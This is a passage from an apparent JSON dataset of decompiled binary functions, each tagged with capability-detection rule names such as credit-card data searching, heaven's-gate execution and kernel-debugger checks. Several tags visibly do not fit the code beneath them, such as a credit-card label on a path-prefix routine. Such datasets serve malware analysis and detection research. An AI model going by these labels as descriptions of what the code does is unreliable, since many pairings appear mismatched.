        "decompiled_code": "\nuint32_t fcn.00061484(ulong arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    uVar1 = fcn.00061c0c();\n    iVar5 = fcn.00061a86(arg1, 0x2e);\n    if (iVar5 != 0) {\n        uVar2 = fcn.00061c0c(iVar5 + 1);\n        iVar5 = fcn.00061a86(iVar5 + 1, 0x2e);\n        if (iVar5 != 0) {\n            uVar3 = fcn.00061c0c(iVar5 + 1);\n            iVar5 = fcn.00061a86(iVar5 + 1, 0x2e);\n            if ((((iVar5 != 0) && (uVar4 = fcn.00061c0c(iVar5 + 1),  uVar1 < 0x100)) && (uVar2 < 0x100)) &&\n               ((uVar3 < 0x100 && (uVar4 < 0x100)))) {\n                return ((uVar4 << 8 | uVar3) << 8 | uVar2) << 8 | uVar1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 314
    },
    "000279c0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid fcn.000279c0(int64_t arg1, char *arg2)\n\n{\n    ulong arg3;\n    uchar auStack280 [272];\n    \n    if (*arg2 == '\\\\') {\n        if (((arg2[1] == '\\\\') && (arg2[2] == '.')) && (arg2[3] == '\\\\')) {\n            arg2 = arg2 + 4;\n        }\n        else if (((arg2[1] == '?') && (arg2[2] == '?')) && (arg2[3] == '\\\\')) {\n            arg3 = 0x11ec0;\n            goto code_r0x00027a0e;\n        }\n    }\n    arg3 = 0x11eb8;\ncode_r0x00027a0e:\n    fcn.0001fd08(auStack280, 0x104, arg3, arg2);\n    *(arg1 + 0x130) = 1;\n    fcn.0004a6f4(0, auStack280, arg1 + 8);\n    *(arg1 + 0x134) = 0;\n    return;\n}\n",
        "token_count": 248
    },
    "0002eb10": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuchar * fcn.0002eb10(ulong arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uchar uVar2;\n    uchar *arg2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    int64_t arg1_00;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uchar auStack120 [11];\n    uchar uStack109;\n    uchar uStack108;\n    uchar uStack107;\n    uchar uStack106;\n    uchar uStack105;\n    uchar uStack104;\n    uchar uStack103;\n    uchar uStack102;\n    uchar uStack101;\n    uchar uStack100;\n    uchar uStack99;\n    uchar uStack98;\n    uchar uStack97;\n    uchar uStack96;\n    uchar uStack95;\n    uchar uStack94;\n    uchar uStack93;\n    uchar uStack92;\n    uchar uStack91;\n    uchar uStack90;\n    uchar uStack89;\n    uchar uStack88;\n    uchar uStack87;\n    uchar uStack86;\n    uchar uStack85;\n    uchar uStack84;\n    uchar uStack82;\n    uchar uStack81;\n    uchar uStack80;\n    uchar uStack79;\n    uchar uStack78;\n    ulong uStack77;\n    ushort uStack69;\n    uchar uStack67;\n    ulong uStack66;\n    \n    uVar6 = in_stack_00000030;\n    arg1_00 = arg1;\n    arg2 = fcn.0002fbc4(uVar6);\n    if (arg2 != NULL) {\n        fcn.00061a56();\n        uVar4 = arg3 * arg4 * in_stack_00000028 - 1;\n        uStack108 = in_stack_00000030 >> 8;\n        auStack120[0] = 0xeb;\n        uStack109 = in_stack_00000030;\n        if (uVar4 < 0xfff6) {\n            uVar5 = 1;\n        }\n        else {\n            uVar5 = uVar4 / 0xfff5;\n            if (uVar5 < 0x100) {\n                if (uVar4 != uVar5 * 0xfff5) {\n                    uVar5 = uVar5 + 1;\n                }\n            }\n            else {\n                uVar5 = 0xff;\n            }\n        }\n        uStack107 = uVar5;\n        uStack106 = 2;\n        uStack105 = 0;\n        uStack104 = 2;\n        uStack103 = 0;\n        uStack102 = 2;\n        uVar2 = uVar4 >> 8;\n        if (uVar4 < 0x10000) {\n            uStack101 = uVar4;\n            uStack100 = uVar2;\n        }\n        uStack99 = 0xf8;\n        uVar1 = (uVar4 - 0x4000 / uVar6) * 2 - 4;\n        uVar3 = uVar5 * in_stack_00000030 + 4;\n        uVar5 = uVar1 / uVar3;\n        if (uVar1 % uVar3 != 0) {\n            uVar5 = uVar5 + 1;\n        }\n        uStack96 = in_stack_00000028;\n        uStack97 = uVar5 >> 8;\n        uStack94 = arg3;\n        uStack98 = uVar5;\n        uStack95 = in_stack_00000028 >> 8;\n        uStack93 = arg3 >> 8;\n        uStack92 = 1;\n        uStack91 = 0;\n        uStack90 = 0;\n        uStack89 = 0;\n        if (0xffff < uVar4) {\n            uStack85 = uVar4 >> 0x18;\n            uStack86 = uVar4 >> 0x10;\n            uStack88 = uVar4;\n            uStack87 = uVar2;\n        }\n        uStack84 = 0x80;\n        uStack82 = 0x29;\n        uStack81 = 0xe8;\n        uStack80 = 0x99;\n        uStack79 = 0x9b;\n        uStack78 = 0xba;\n        uStack77 = *0x14088;\n        uStack69 = *0x14090;\n        uStack67 = *0x14092;\n        uStack66 = 0x2020203631544146;\n        fcn.00061a56(arg2, 0, uVar6);\n        fcn.000619f6(arg2, auStack120);\n        fcn.0002de90(arg1_00, arg2, 0);\n        fcn.00061a56(arg2, 0);\n        if (uVar5 * 2 != 0) {\n            uVar6 = uVar5 * 2;\n            uVar4 = in_stack_00000030;\n            do {\n                uVar4 = uVar4 + in_stack_00000030;\n                fcn.0002de90(arg1_00, arg2, uVar4);\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        *arg2 = 0xf8;\n        arg2[1] = 0xff;\n        arg2[2] = 0xff;\n        arg2[3] = 0xff;\n        fcn.0002de90(arg1_00, arg2, in_stack_00000030 * 2);\n        fcn.0002de90(arg1_00, arg2, (uVar5 + 2) * in_stack_00000030);\n        fcn.0002fc50(arg2);\n        arg2 = 0x1;\n    }\n    return arg2;\n}\n",
        "token_count": 1305
    },
    "0002fcf4": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t fcn.0002fcf4(ulong arg1)\n\n{\n    uint32_t uStackX8;\n    \n    uStackX8 = arg1 << 0x18;\n    uStackX8 = uStackX8 | CONCAT12(arg1 >> 8, CONCAT11(arg1 >> 0x10, arg1 >> 0x18));\n    return uStackX8;\n}\n",
        "token_count": 87
    },
    "00030a80": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.00030a80(int64_t *arg1, ushort *arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int32_t *piVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    \n    iVar1 = *arg1;\n    iVar9 = iVar1 + SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar1) >> 0x40, 0);\n    iVar9 = (iVar9 >> 0x17) - (iVar9 >> 0x3f);\n    arg2[7] = (iVar1 + iVar9 * -10000000) / 10000;\n    uVar7 = iVar9 / 0x15180;\n    uVar8 = iVar9 + uVar7 * -0x15180;\n    if (uVar8 < 0) {\n        iVar4 = (-uVar8 - 1) / 0x15180 + 1;\n        uVar7 = uVar7 - iVar4;\n        uVar8 = uVar8 + iVar4 * 0x15180;\n    }\n    if (0x1517f < uVar8) {\n        uVar7 = uVar7 + uVar8 / 0x15180;\n        uVar8 = uVar8 % 0x15180;\n    }\n    arg2[4] = uVar8 / 0xe10;\n    iVar4 = uVar8 % 0xe10;\n    iVar3 = (iVar4 / 0x3c + (iVar4 >> 0x1f)) - (iVar4 * 0x88888889 >> 0x3f);\n    arg2[5] = iVar3;\n    arg2[6] = iVar4 + iVar3 * -0x3c;\n    iVar4 = 0x641;\n    uVar2 = 0;\n    arg2[2] = uVar7 + ((uVar7 / 7 + ((uVar7 >> 0x10) >> 0xf)) - (uVar7 * 0x92492493 >> 0x3f)) * -7;\n    while( true ) {\n        uVar8 = iVar4 >> 0x1f & 3;\n        uVar5 = uVar2;\n        if (((iVar4 + uVar8 & 3) == uVar8) && ((iVar4 != (iVar4 / 100) * 100 || (iVar4 == (iVar4 / 400) * 400)))) {\n            uVar5 = 1;\n        }\n        if (uVar7 < *(uVar5 * 4 + 0x140d0)) break;\n        iVar4 = iVar4 + 1;\n        uVar7 = uVar7 - *(uVar5 * 4 + 0x140d0);\n    }\n    *arg2 = iVar4;\n    piVar6 = uVar5 * 0x30 + 0x140e0;\n    iVar4 = *piVar6;\n    while (iVar4 <= uVar7) {\n        uVar7 = uVar7 - iVar4;\n        uVar8 = uVar2 + 1;\n        uVar2 = uVar8;\n        iVar4 = piVar6[uVar8];\n    }\n    arg2[1] = uVar2 + 1;\n    arg2[3] = uVar7 + 1;\n    return;\n}\n",
        "token_count": 791
    },
    "0004f4f8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0004f4f8(uint8_t param_1)\n\n{\n    if (param_1 < 0xa1) {\n        if (param_1 == 0xa0) {\n            return 0x169;\n        }\n        if (param_1 < 0x91) {\n            if (param_1 == 0x90) {\n                return 0x168;\n            }\n            if (param_1 == 0xc) {\n                return 0x177;\n            }\n            if (param_1 == 0xd) {\n                return 0x176;\n            }\n            if (param_1 == 0x1c) {\n                return 0x164;\n            }\n            if (param_1 == 0x1d) {\n                return 0x163;\n            }\n            if (param_1 == 0x8a) {\n                return 0x16d;\n            }\n            if (param_1 == 0x8e) {\n                return 0x16e;\n            }\n        }\n        else {\n            if (param_1 == 0x94) {\n                return 0x16b;\n            }\n            if (param_1 == 0x96) {\n                return 0x16f;\n            }\n            if (param_1 == 0x97) {\n                return 0x173;\n            }\n            if (param_1 == 0x9a) {\n                return 0x174;\n            }\n            if (param_1 == 0x9e) {\n                return 0x166;\n            }\n        }\n    }\n    else if (param_1 < 0xb1) {\n        if (param_1 == 0xb0) {\n            return 0x167;\n        }\n        if (param_1 == 0xa4) {\n            return 0x16a;\n        }\n        if (param_1 == 0xa6) {\n            return 0x170;\n        }\n        if (param_1 == 0xa7) {\n            return 0x172;\n        }\n        if (param_1 == 0xaa) {\n            return 0x175;\n        }\n        if (param_1 == 0xae) {\n            return 0x165;\n        }\n    }\n    else {\n        if (param_1 == 0xb4) {\n            return 0x16c;\n        }\n        if (param_1 == 0xb6) {\n            return 0x171;\n        }\n        if (param_1 == 0xb7) {\n            return 0x17f;\n        }\n        if (param_1 == 0xbb) {\n            return 0x1a4;\n        }\n        if (param_1 == 0xbf) {\n            return 0x15a;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 619
    },
    "0002e6a4": {
        "rules": [
            "compute adler32 checksum/9b5b0101cb1f4ee58265f4165dc89da1/add814525c1e453b80d52fb1e3a7e9dc"
        ],
        "decompiled_code": "\nint32_t fcn.0002e6a4(uint8_t param_1)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    char acStackX16 [8];\n    uint64_t uStackX24;\n    ulong uStackX32;\n    ulong in_stack_fffffffffffffeb8;\n    uint uVar4;\n    ulong uVar3;\n    uint64_t in_stack_fffffffffffffec0;\n    uint uVar5;\n    uchar auStack280 [16];\n    uint auStack264 [2];\n    ulong uStack256;\n    uchar *puStack248;\n    uint uStack240;\n    ulong uStack232;\n    ulong uStack224;\n    uchar auStack200 [184];\n    \n    uVar4 = in_stack_fffffffffffffeb8 >> 0x20;\n    if (*0x7a598 == '\\0') {\n        if (*0x79c90 == 0) {\n            iVar1 = -0x3fffffff;\n        }\n        else {\n            uVar2 = 0x7a5f8;\n            *0x7a5f0 = 0;\n            (*_fcn.00011600)(0x7a5f8, 1);\n            *0x7a5e8 = 0x7a5e0;\n            *0x7a5e0 = 0x7a5e0;\n            iVar1 = fcn.0002e0b0(uVar2 & 0xffffffffffffff00 | param_1, acStackX16);\n            if (iVar1 == 0) {\n                fcn.00028540(auStack200, 0x52);\n                fcn.000619f0(auStack280, auStack200);\n                in_stack_fffffffffffffec0 = in_stack_fffffffffffffec0 & 0xffffffffffffff00;\n                uVar3 = CONCAT44(uVar4, 1);\n                iVar1 = (**0x11378)(*0x79c90, 0, auStack280, 7, uVar3, in_stack_fffffffffffffec0, 0x7a5d0);\n                uVar4 = uVar3 >> 0x20;\n                uVar5 = in_stack_fffffffffffffec0 >> 0x20;\n                if ((iVar1 == 0) && (iVar1 = fcn.0002e034(*0x7a5d0),  iVar1 == 0)) {\n                    *(*0x7a5d0 + 0x30) = *(*0x7a5d0 + 0x30) | 0x10;\n                    *(*0x7a5d0 + 0x30) = *(*0x7a5d0 + 0x30) & 0xffffff7f;\n                    iVar1 = fcn.00016d54(*0x7a5d0, 0x2d670, 0);\n                    if (iVar1 == 0) {\n                        auStack264[0] = 0x30;\n                        uStack256 = 0;\n                        uStack240 = 0;\n                        puStack248 = NULL;\n                        uStack232 = 0;\n                        uStack224 = 0;\n                        *0x7a5c8 = 0x1000000;\n                        iVar1 = fcn.00061b46(0x7a5a8, 6, auStack264, 0x7a5c8, CONCAT44(uVar4, 4), \n                                             CONCAT44(uVar5, 0x18000000), 0);\n                        if (iVar1 == 0) {\n                            uStackX24 = *0x7a5c8;\n                            uVar2 = 0;\n                            uVar4 = 0;\n                            iVar1 = fcn.00061b40(*0x7a5a8, 0xffffffffffffffff, 0x7a5b8, 0, 0, 0, &uStackX24, 2, 0, 4);\n                            if (iVar1 == 0) {\n                                *0x7a5c8 = uStackX24;\n                                fcn.00028598(auStack200, 0x52);\n                                fcn.000619f0(auStack280, auStack200);\n                                iVar1 = (**0x11378)(*0x79c90, 0, auStack280, 7, CONCAT44(uVar4, 1), \n                                                    uVar2 & 0xffffffffffffff00, 0x7a5d8);\n                                if ((iVar1 == 0) && (iVar1 = fcn.0002e034(*0x7a5d8),  iVar1 == 0)) {\n                                    *(*0x7a5d8 + 0x30) = *(*0x7a5d8 + 0x30) | 0x10;\n                                    *(*0x7a5d8 + 0x30) = *(*0x7a5d8 + 0x30) & 0xffffff7f;\n                                    iVar1 = fcn.00016d54(*0x7a5d8, 0x2d670, 0);\n                                    if (iVar1 == 0) {\n                                        fcn.0002eb10(1, *0x7a5c8 & 0xffffffff, 2, (*0x7a5c8 & 0xffffffff) >> 0xf);\n                                        *0x7a599 = 0;\n                                        iVar1 = fcn.0001a650(0x7a610, 190000, 0);\n                                        if (iVar1 == 0) {\n                                            *0x7a598 = 1;\n                                            if (acStackX16[0] == '\\0') {\n                                                fcn.00028540(auStack200, 0x52);\n                                                fcn.000619f0(auStack280, auStack200);\n                                                puStack248 = auStack280;\n                                                auStack264[0] = 0x30;\n                                                uStack256 = 0;\n                                                uStack240 = 0x40;\n                                                uStack232 = 0;\n                                                uStack224 = 0;\n                                                iVar1 = fcn.00061a26();\n                                                if (iVar1 == 0) {\n                                                    fcn.000619de(uStackX32);\n                                                    return 0;\n                                                }\n                                            }\n                                            fcn.0002eb10(0, *0x7a5c0, 2, *0x7a5c0 >> 0xf);\n                                            return 0;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            if (*0x7a5d0 != 0) {\n                (*_fcn.00011360)();\n                fcn.00016dd4(*0x7a5d0);\n                *0x7a5d0 = 0;\n            }\n            if (*0x7a5d8 != 0) {\n                (*_fcn.00011360)();\n                fcn.00016dd4(*0x7a5d8);\n                *0x7a5d8 = 0;\n            }\n            if (*0x7a5b8 != 0) {\n                fcn.00061b3a(0xffffffffffffffff);\n                *0x7a5b8 = 0;\n            }\n            if (*0x7a5a8 != 0) {\n                fcn.000619de();\n                *0x7a5a8 = 0;\n            }\n        }\n    }\n    else {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 1664
    },
    "000362c0": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nuint64_t fcn.000362c0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uchar auStackX16 [24];\n    uint64_t uVar4;\n    \n    uVar2 = 0;\n    fcn.00031564(0x88a90, auStackX16, 1);\n    if (0 < *0x88a80) {\n        piVar1 = *0x88a88 + 0x18;\n        uVar4 = uVar2;\n        do {\n            if (*piVar1 == arg1) {\n                uVar2 = *(uVar4 * 0x20 + 8 + *0x88a88);\n                break;\n            }\n            uVar3 = uVar4 + 1;\n            uVar4 = uVar3;\n            piVar1 = piVar1 + 4;\n        } while (uVar3 < *0x88a80);\n    }\n    fcn.00031598(0x88a90, auStackX16, 1);\n    return uVar2;\n}\n",
        "token_count": 253
    },
    "00036404": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nulong * fcn.00036404(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    ulong *puVar7;\n    ulong *puVar8;\n    ulong *puVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    ulong *puStackX24;\n    int64_t iStackX32;\n    uchar auStack88 [24];\n    \n    puVar9 = NULL;\n    uVar10 = 0;\n    fcn.00031564(0x88a90, auStack88, 1);\n    if (*0x88a88 != 0) {\n        iVar4 = *0x88a88;\n        puVar7 = puVar9;\n        puVar8 = puVar9;\n        iVar6 = *0x88a80;\n        if (0 < *0x88a80) {\n            do {\n                puVar2 = *(puVar8 + iVar4);\n                while (puVar2 != NULL) {\n                    puVar1 = *puVar2;\n                    fcn.0002fc50(puVar2);\n                    puVar2 = puVar1;\n                    iVar4 = *0x88a88;\n                    iVar6 = *0x88a80;\n                }\n                uVar5 = puVar7 + 1;\n                puVar7 = uVar5;\n                puVar8 = puVar8 + 4;\n            } while (uVar5 < iVar6);\n        }\n        fcn.0002fc50(iVar4);\n        *0x88a80 = 0;\n    }\n    *0x88a88 = 0;\n    if (arg2 == 0) {\n        iVar6 = 1;\n        iVar4 = arg1;\n        for (iVar3 = *(arg1 + 0x188); ((iVar3 != 0 && (iVar3 != iVar4)) && (iVar3 != iVar4 + 0x188));\n            iVar3 = *(iVar3 + 0x188)) {\n            iVar6 = iVar6 + 1;\n            iVar4 = iVar3;\n        }\n        iVar4 = iVar6 << 5;\n        *0x88a88 = fcn.0002fbf0(iVar4);\n        if (*0x88a88 == 0) {\ncode_r0x0003661d:\n            uVar10 = 0xc000009a;\n        }\n        else {\n            fcn.00061a56(*0x88a88, 0, iVar4);\n            iStackX32 = 0;\n            puVar7 = puVar9;\n            if (0 < iVar6) {\ncode_r0x0003651c:\n                *(puVar7 + *0x88a88 + 8) = arg1;\n                *(puVar7 + *0x88a88 + 0x10) = *(arg1 + 0x18);\n                *(puVar7 + *0x88a88 + 0x18) = *(arg1 + 0x38);\n                puStackX24 = NULL;\n                puVar8 = puVar9;\n                iVar4 = *(arg1 + 0x10);\n                do {\n                    puVar2 = fcn.0002fbf0(0x20);\n                    if (puVar2 == NULL) goto joined_r0x000365b3;\n                    fcn.00061a56(puVar2, 0, 0x20);\n                    puVar2[1] = iVar4;\n                    puVar2[2] = *(iVar4 + 0x18);\n                    iVar3 = *(iVar4 + 0x10);\n                    puVar1 = puVar2;\n                    if (puStackX24 != NULL) {\n                        *puStackX24 = puVar2;\n                        puVar1 = puStackX24;\n                    }\n                    puStackX24 = puVar1;\n                    if (puVar8 == NULL) {\n                        puVar8 = puVar2;\n                    }\n                    puVar2 = puVar8;\n                } while ((iVar3 != 0) && (bVar11 = iVar3 != iVar4,  iVar4 = iVar3,  bVar11));\n                goto code_r0x000365cb;\n            }\n        }\ncode_r0x00036623:\n        *0x88a80 = iVar6;\n        if ((uVar10 != 0) && (*0x88a88 != 0)) {\n            iVar4 = *0x88a88;\n            puVar7 = puVar9;\n            if (0 < iVar6) {\n                do {\n                    puVar8 = *(puVar9 + iVar4);\n                    while (puVar8 != NULL) {\n                        puVar2 = *puVar8;\n                        fcn.0002fc50(puVar8);\n                        puVar8 = puVar2;\n                        iVar4 = *0x88a88;\n                        iVar6 = *0x88a80;\n                    }\n                    uVar5 = puVar7 + 1;\n                    puVar9 = puVar9 + 4;\n                    puVar7 = uVar5;\n                } while (uVar5 < iVar6);\n            }\n            fcn.0002fc50(iVar4);\n            *0x88a80 = 0;\n        }\n        puVar9 = uVar10;\n    }\n    fcn.00031598(0x88a90, auStack88, 1);\n    return puVar9;\njoined_r0x000365b3:\n    while (puVar2 = puVar9,  puVar8 != NULL) {\n        puVar2 = *puVar8;\n        fcn.0002fc50(puVar8);\n        puVar8 = puVar2;\n    }\ncode_r0x000365cb:\n    *(puVar7 + *0x88a88) = puVar2;\n    if (*(puVar7 + *0x88a88) == 0) goto code_r0x0003661d;\n    iVar4 = *(arg1 + 0x188);\n    if ((iVar4 == 0) || (iVar4 == arg1)) goto code_r0x00036623;\n    iStackX32 = iStackX32 + 1;\n    puVar7 = puVar7 + 4;\n    arg1 = iVar4;\n    if (iVar6 <= iStackX32) goto code_r0x00036623;\n    goto code_r0x0003651c;\n}\n",
        "token_count": 1435
    },
    "00048eb8": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nuint fcn.00048eb8(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    uVar2 = 0;\n    if (*0x87978 == '\\0') {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        fcn.0002f23c(0x87960);\n        iVar5 = arg1 * 0x60;\n        iVar1 = fcn.00026a7c(*(iVar5 + 0x66348), 0);\n        *(iVar5 + 0x6634c) = iVar1;\n        if (iVar1 == 0) {\n            *(iVar5 + 0x6634c) = 0xffffffff;\n        }\n        iVar1 = fcn.00026a7c(*(iVar5 + 0x66350), 0);\n        *(iVar5 + 0x66354) = iVar1;\n        if (iVar1 == 0) {\n            *(iVar5 + 0x66354) = 0xffffffff;\n        }\n        if (*(iVar5 + 0x66344) == 0) {\n            iVar4 = fcn.000305c4(*(iVar5 + 0x66398), 0x15d00);\n            *(iVar5 + 0x66390) = iVar4;\n            if (iVar4 == 0) {\n                uVar2 = fcn.0002fde4();\n            }\n            else {\n                fcn.00061a56(iVar5 + 0x66358, 0, 0x28);\n                uVar3 = fcn.0002ff60(*(iVar5 + 0x66390));\n                iVar1 = fcn.0002ff64(uVar3);\n                *(iVar5 + 0x66378) = iVar1;\n                fcn.00026ad8(*(iVar5 + 0x66340), 1);\n                *(iVar5 + 0x66344) = 1;\n            }\n        }\n        else {\n            uVar2 = 0x21590006;\n        }\n        fcn.0002f2a4(0x87960);\n    }\n    return uVar2;\n}\n",
        "token_count": 499
    },
    "00049024": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nbool fcn.00049024(ulong arg1)\n\n{\n    return *(arg1 * 0x60 + 0x66344) != 0;\n}\n",
        "token_count": 36
    },
    "0004916c": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.0004916c(ulong arg1)\n\n{\n    int64_t *piVar1;\n    \n    piVar1 = arg1 * 0x60 + 0x66358;\n    *piVar1 = *piVar1 + 1;\n    return;\n}\n",
        "token_count": 62
    },
    "00049184": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.00049184(ulong arg1)\n\n{\n    int64_t *piVar1;\n    \n    piVar1 = arg1 * 0x60 + 0x66360;\n    *piVar1 = *piVar1 + 1;\n    return;\n}\n",
        "token_count": 61
    },
    "0003f9fc": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nint32_t fcn.0003f9fc(uint32_t *arg1, ulong arg2)\n\n{\n    char cVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint8_t *puVar7;\n    bool bVar8;\n    \n    if (0x1e < arg2) {\n        bVar8 = *arg1 < *0x158b8;\n        if ((*arg1 == *0x158b8) && (bVar8 = *(arg1 + 1) < *0x158bc,  *(arg1 + 1) == *0x158bc)) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = (1 - bVar8) - (bVar8 != 0);\n        }\n        if (((iVar4 == 0) && (iVar5 = fcn.00061bb8(arg1 + 5),  iVar5 != 0)) && (*(iVar5 + 0xb) == '&')) {\n            cVar1 = *(iVar5 + 0xc);\n            iVar6 = 8;\n            uVar3 = 0;\n            puVar2 = iVar5 + 1;\n            do {\n                puVar7 = puVar2;\n                uVar3 = uVar3 + *puVar7;\n                iVar6 = iVar6 + -1;\n                puVar2 = puVar7 + 1;\n            } while (iVar6 != 0);\n            if (((puVar7[1] == uVar3 / 0x1a + 0x41) && (puVar7[2] == 0x7a - uVar3 % 0x1a)) &&\n               (iVar5 = fcn.00061bb8(puVar7 + 4, 0x20, (arg2 - 10) - 0xd),  iVar5 != 0)) {\n                bVar8 = *(iVar5 + 1) < *0x156d8;\n                if ((*(iVar5 + 1) == *0x156d8) && (bVar8 = *(iVar5 + 5) < *0x156dc,  *(iVar5 + 5) == *0x156dc)) {\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = (1 - bVar8) - (bVar8 != 0);\n                }\n                if (iVar4 == 0) {\n                    return 7 - (cVar1 != 'a');\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 580
    },
    "00048928": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nvoid fcn.00048928(ulong *arg1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    char in_DL;\n    int16_t *piVar5;\n    uchar auStackX24 [16];\n    ushort auStack184 [12];\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    int32_t iStack144;\n    int32_t iStack140;\n    int16_t aiStack120 [48];\n    \n    cVar2 = fcn.00049024(2);\n    if ((cVar2 != '\\0') && (-1 < *(arg1 + 3))) {\n        iVar3 = (**0x87928)(*arg1, 0);\n        if (iVar3 != *0x66330) {\n            *0x66330 = iVar3;\n            iVar3 = fcn.00030f70(auStack184, 0x11);\n            if (iVar3 == 0) {\n                auStack184[0] = 0x3f;\n            }\n            fcn.00030130(auStackX24);\n            fcn.00030c6c(auStackX24, &uStack160);\n            fcn.00061a62(aiStack120, 0x15ca0, iStack140 + 0x76c, iStack144 + 1, uStack148, uStack152, uStack156, \n                         uStack160, auStack184);\n            uVar4 = 0xffffffffffffffff;\n            piVar5 = aiStack120;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            fcn.00049b14(2, aiStack120, (~uVar4 - 1 & 0xffffffff) * 2);\n        }\n        fcn.00049b14(2, arg1 + 2, (-(in_DL != '\\0') & 2) + 2);\n    }\n    return;\n}\n",
        "token_count": 487
    },
    "0005f26c": {
        "rules": [
            "parse credit card information/2fba96855ce44cd2afbbefaf4df20b4d",
            "search for credit card data/546f8dc683b8415fa126b38355d21de5"
        ],
        "decompiled_code": "\nuint64_t fcn.0005f26c(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint32_t in_stack_00000028;\n    \n    iVar3 = fcn.0005f0c0(arg1);\n    if (iVar3 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x45) || (pcVar2 = *(piVar1 + 0x11),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar5 = 0x21590001;\n        }\n        else {\n            uVar4 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            if (uVar4 == 0) {\n                uVar4 = fcn.00060728(arg2, arg3, arg4, in_stack_00000028);\n            }\n            uVar5 = uVar4;\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    else {\n        uVar5 = fcn.00060728(arg2, arg3, arg4, in_stack_00000028);\n    }\n    return uVar5;\n}\n",
        "token_count": 320
    },
    "000160e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
